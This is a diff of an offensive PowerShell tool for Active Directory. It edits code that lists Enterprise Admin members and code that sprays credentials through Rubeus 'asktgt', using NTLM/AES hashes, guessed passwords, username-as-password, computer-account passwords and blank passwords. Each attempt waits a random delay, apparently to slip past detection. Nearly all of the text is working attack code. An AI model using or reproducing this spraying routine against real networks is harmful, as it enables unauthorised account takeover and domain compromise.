@@ -404,13 +404,12 @@ $searcher.Filter = "(&(objectCategory=group)(cn=$EnterpriseAdminGroupName))"
 $searcher.PropertiesToLoad.AddRange(@("member"))
 $group = $searcher.FindOne()
 
-if ($group.Properties["member"] -ne $null -and $group.Properties["member"].Count -gt 0) {
-    $EnterpriseAdmins = $group.Properties["member"] | ForEach-Object {
-        $userDN = $_.ToString()
-        $user = [ADSI]"LDAP://$userDN"
-        $userProperties = $user.Properties.PropertyNames
-        $samAccountName = $userProperties | Where-Object { $_ -eq "samaccountname" }
-        $user.Properties[$samAccountName][0]
+$EnterpriseAdmins = $group.Properties["member"] | ForEach-Object {
+     $userDN = $_.ToString()
+     $user = [ADSI]"LDAP://$userDN"
+     $userProperties = $user.Properties.PropertyNames
+     $samAccountName = $userProperties | Where-Object { $_ -eq "samaccountname" }
+     $user.Properties[$samAccountName][0]
     }
 } Catch {}
 
@@ -3482,8 +3481,8 @@ Write-Output " - Removed disabled accounts from spraying"
                     }
             }
 
-            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash" | Out-String}
-            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash" | Out-String}
+            if ($Hash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$Hash /domain:$domain" | Out-String}
+            if ($Hash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$Hash  /domain:$domain" | Out-String}
             
             # Check for Unhandled Rubeus exception
             if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3538,7 +3537,7 @@ Write-Output " - Removed disabled accounts from spraying"
 		$Delay = Get-Random -Minimum 69 -Maximum 800
 		Start-Sleep -Milliseconds $Delay
         
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$Password" | Out-String
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$Password /domain:$domain" | Out-String
         
         # Check for Unhandled Rubeus exception
         if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3592,7 +3591,7 @@ Write-Output " - Removed disabled accounts from spraying"
 		$Delay = Get-Random -Minimum 69 -Maximum 800
 		Start-Sleep -Milliseconds $Delay
         
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$UserToSpray" | Out-String
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:$UserToSpray /domain:$domain" | Out-String
         
         # Check for Unhandled Rubeus exception
         if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3625,7 +3624,7 @@ Write-Output " - Removed disabled accounts from spraying"
 		$Delay = Get-Random -Minimum 69 -Maximum 800
 		Start-Sleep -Milliseconds $Delay
         
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$ComputerToSpray /password:$ComputerToSprayPassword" | Out-String
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$ComputerToSpray /password:$ComputerToSprayPassword /domain:$domain" | Out-String
 
         # Check for Unhandled Rubeus exception
         if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -3674,7 +3673,7 @@ Write-Output " - Removed disabled accounts from spraying"
 		$Delay = Get-Random -Minimum 69 -Maximum 800
 		Start-Sleep -Milliseconds $Delay
         
-        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password:" | Out-String
+        $Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /password: /domain:$domain" | Out-String
         
         # Check for Unhandled Rubeus exception
         if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
